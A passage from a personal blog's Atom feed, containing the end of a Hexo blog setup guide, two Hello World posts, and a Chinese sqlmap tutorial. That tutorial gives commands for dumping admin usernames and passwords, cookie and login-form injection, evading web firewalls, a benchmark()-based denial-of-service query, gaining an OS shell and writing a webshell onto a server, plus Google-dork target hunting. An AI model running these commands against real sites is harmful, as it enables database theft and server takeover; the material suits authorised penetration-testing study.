–debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p><h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p><pre><code>代码：tags: - 前端- hexocategories: - 前端在博客根目录输入hexo new page tags打开 tags/index.md ，并改成：title: 标签date: 日期type: &quot;tags&quot;comments: false分类同理hexo new page categories打开category/index.md，改为：title: 分类date: 日期type: &quot;categories&quot;comments: false</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p><p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_585.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_329.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#hexo博客搭建&lt;/p&gt;
&lt;p&gt;##安装git,nodejs,npm，并了解相关基础知识&lt;br&gt;下载nodejs和git(&lt;a href=&quot;https://git-scm.com/)并安装&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://g
      
    
    </summary>
    
      <category term="博客" scheme="http://0xmj.club/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="hexo" scheme="http://0xmj.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP注入教程-11种常见SQLMAP使用方法详解</title>
    <link href="http://0xmj.club/2017/11/21/SQLMAP%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B-11%E7%A7%8D%E5%B8%B8%E8%A7%81SQLMAP%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2017/11/21/SQLMAP注入教程-11种常见SQLMAP使用方法详解/</id>
    <published>2017-11-20T20:27:10.000Z</published>
    <updated>2017-11-22T09:14:28.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解"><a href="#SQLMAP注入教程-11种常见SQLMAP使用方法详解" class="headerlink" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解"></a>SQLMAP注入教程-11种常见SQLMAP使用方法详解</h1><pre><code>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</code></pre><p>一共有11种常见SQLmap使用方法：</p><p>一、SQLMAP用于Access数据库注入</p><p>(1) 猜解是否能注入<br>1<br>2</p><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“<br>Linux : .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“</p><p>(2) 猜解表</p><p>1<br>2</p><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables</p><p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p><p>1<br>2</p><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin</p><p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p><p>1<br>2<br>3</p><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C “username,password”<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C<br>“username,[url=]B[/url]password”</p><p>二、SQLMAP用于Cookie注入</p><p>(1) cookie注入，猜解表</p><p>1</p><p>win : python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –table –level 2</p><p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p><p>1<br>2</p><p>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –columns -T<br>admin –level 2</p><p>(3) 猜解内容</p><p>1<br>2</p><p>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –dump -T<br>admin -C “username,password” –level 2</p><p>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</p><p>1<br>2<br>3<br>4</p><p>win:<br>python sqlmap.py -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell<br>Linux:<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell</p><p>(2) 输入执行语句完成DDOS攻击</p><p>1</p><p>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</p><p>四、SQLMAP用于mysql注入</p><p>(1) 查找数据库</p><p>1</p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ –dbs</p><p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p><p>1</p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname –tables</p><p>(3) 通过2中的表得出列名(假如表为table_name)</p><p>1</p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name –columns</p><p>(4) 获取字段的值(假如扫描出id,user,password字段)</p><p>1<br>2</p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name -C<br>“id,user,password” –dump</p><p>五、SQLMAP中post登陆框注入</p><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p><pre><code>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</code></pre><ol><li>浏览器打开目标地址http:// www.xxx.com /Login.asp</li></ol><ol><li>配置burp代理(127.0.0.1:8080)以拦截请求</li></ol><ol><li>点击login表单的submit按钮</li></ol><ol><li>这时候Burp会拦截到了我们的登录POST请求</li></ol><ol><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li></ol><ol><li>运行sqlmap并使用如下命令：</li></ol><p>1</p><p>./sqlmap.py -r search-test.txt -p tfUPass</p><p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p><p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a></p><p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p><p>(2) 自动的搜索</p><p>1</p><p>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –forms</p><p>(3) 指定参数搜索</p><p>1</p><p>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –data “tfUName=321&amp;tfUPass=321”</p><p>六、SQLMAP中Google搜索注入</p><p>inurl后面的语言是由自己定的</p><p>注入过程中如果选y是注入，如果不是选n</p><p>1</p><p>sqlmap -g inurl:php?id=</p><p>七、SQLMAP中的请求延迟</p><p>参数 –delay –safe-freq</p><p>1<br>2</p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –safe-freq 3</p><p>参数</p><p>八、SQLMAP绕过WAF防火墙</p><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p><p>1</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] -v 3 –dbs –batch –tamper “space2morehash.py”</p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p><p>都是编码方式</p><p>space2hash.py base64encode.py charencode.py</p><p>九、SQLMAP查看权限</p><p>1</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –privileges</p><p>十、SQLMAP伪静态注入(1) 查找数据库</p><p>1</p><p>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –dbs</p><p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p><p>1</p><p>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname –tables</p><p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p><p>1<br>2</p><p>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename –columns</p><p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p><p>1<br>2</p><p>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename -C “password” –dump</p><p>十一、SQLMAP注入点执行命令与交互写shell </p><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p><p>此处采用的是Linux系统</p><p>1</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-cmd=ipconfig</p><p>出现语言的选择根据实际的测试网站选择语言</p><p>指定目标站点D:/www/ </p><p>(2) 获取Shell</p><p>1</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-shell</p><p>出现语言的选择根据实际的测试网站选择语言</p><p>指定目标站点D:/www/</p><p>输入ipconfig/all</p><p>创建用户和删除用户</p><p>只要权限足够大，你可以输入使用任何命令。</p><p>其他命令参考下面：</p><p>从数据库中搜索字段</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p><p>在dedecms数据库中搜索字段admin或者password。</p><p>读取与写入文件</p><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>#示例：</p><p>1</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><p>使用shell命令：</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写目录：</p><p>“E:\php\htdocs\dvwa”</p><p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><p>sqlmap详细命令：</p><pre><code>-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库-current-db 网站当前数据库-users 所有数据库用户-current-user 当前数据库用户-random-agent 构造随机user-agent-passwords 数据库密码-proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</code></pre><p>Options（选项）：</p><pre><code>-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）</code></pre><p>Target（目标）：</p><p>以下至少需要设置其中一个选项，设置目标URL。</p><pre><code>-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。</code></pre><p>Request（请求）：</p><p>这些选项可以用来指定如何连接到目标URL。</p><pre><code>-data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</code></pre><p>Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p><pre><code>-b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell</code></pre><p>Optimization（优化）：</p><p>这些选项可用于优化SqlMap的性能。</p><pre><code>-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</code></pre><p>Injection（注入）：</p><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><pre><code>-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</code></pre><p>Detection（检测）：</p><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页</code></pre><p>Techniques（技巧）：</p><p>这些选项可用于调整具体的SQL注入测试。</p><pre><code>–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符</code></pre><p>Fingerprint（指纹）：</p><pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹</code></pre><p>Brute force（蛮力）：</p><p>这些选项可以被用来运行蛮力检查。</p><pre><code>–common-tables 检查存在共同表–common-columns 检查存在共同列</code></pre><p>User-defined function injection（用户自定义函数注入）：</p><p>这些选项可以用来创建用户自定义函数。</p><p>–udf-inject 注入用户自定义函数</p><p>–shared-lib=SHLIB 共享库的本地路径</p><p>File system access（访问文件系统）：</p><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre><p>Operating system access（操作系统访问）：</p><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><pre><code>–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径</code></pre><p>Windows注册表访问：</p><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><pre><code>–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。</code></pre><p>Miscellaneous（杂项）：</p><pre><code>–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot;&gt;&lt;a href=&quot;#SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot;&gt;&lt;/a&gt;SQ
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlmap" scheme="http://0xmj.club/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>my-first-blog</title>
    <link href="http://0xmj.club/2017/09/27/Hello%20World%20/"/>
    <id>http://0xmj.club/2017/09/27/Hello World /</id>
    <published>2017-09-27T08:56:58.000Z</published>
    <updated>2017-11-22T09:01:34.087Z</updated>
    
    <content type="html"><![CDATA[<p>description:<br>和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;description:&lt;br&gt;和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！&lt;/p&gt;
&lt;hr&gt;

      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="first-blog" scheme="http://0xmj.club/tags/first-blog/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://0xmj.club/2017/09/25/hello-world/"/>
    <id>http://0xmj.club/2017/09/25/hello-world/</id>
    <published>2017-09-25T03:30:25.298Z</published>
    <updated>2017-09-25T03:30:25.298Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
